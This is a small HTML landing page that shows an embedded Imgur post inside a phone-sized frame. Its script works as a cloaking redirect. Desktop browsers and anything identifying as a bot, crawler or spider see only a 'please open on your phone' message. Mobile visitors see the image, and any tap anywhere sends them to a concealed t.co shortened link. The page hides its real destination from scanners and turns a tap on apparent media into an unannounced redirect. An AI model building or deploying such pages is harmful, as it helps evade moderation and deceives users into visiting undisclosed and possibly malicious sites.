<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Landing Page</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      width: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #000;
      font-family: sans-serif;
      overflow: hidden;
    }

    .container {
      position: relative;
      width: 100%;
      max-width: 400px;
      aspect-ratio: 9 / 16; /* Instagram Reel aspect ratio */
      border-radius: 20px;
      overflow: hidden;
      box-shadow: 0 0 25px rgba(0,0,0,0.6);
      background: #000;
    }

    .container iframe,
    .container img {
      width: 100%;
      height: 100%;
      border: 0;
      display: block;
    }

    /* Message for blocked devices */
    body.blocked {
      display: flex;
      justify-content: center;
      align-items: center;
      background: #000;
      color: #fff;
      text-align: center;
      font-size: 1.2rem;
      padding: 20px;
    }
  </style>
</head>
<body>

  <div class="container" id="mainContent" style="display:none;">
    <!-- Imgur Embed -->
    <blockquote class="imgur-embed-pub" lang="en" data-id="OAn14am">
      <a href="https://imgur.com/OAn14am">View post on imgur.com</a>
    </blockquote>
    <script async src="//s.imgur.com/min/embed.js" charset="utf-8"></script>
  </div>

  <script>
    const targetUrl = "https://t.co/hw376Xavsh";

    // Detect if it's a mobile device
    function isMobile() {
      return /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(navigator.userAgent);
    }

    // Detect bots
    function isBot() {
      return /bot|crawler|spider|crawling/i.test(navigator.userAgent);
    }

    if (!isMobile() || isBot()) {
      document.body.classList.add('blocked');
      document.body.innerHTML = "<p>⚠️ Please open this page on your phone or tablet.</p>";
    } else {
      // Show the main content for mobile users
      const main = document.getElementById("mainContent");
      main.style.display = "block";

      // Redirect when the user taps anywhere
      document.body.addEventListener("click", () => {
        window.location.href = targetUrl;
      });
    }
  </script>

</body>
</html>
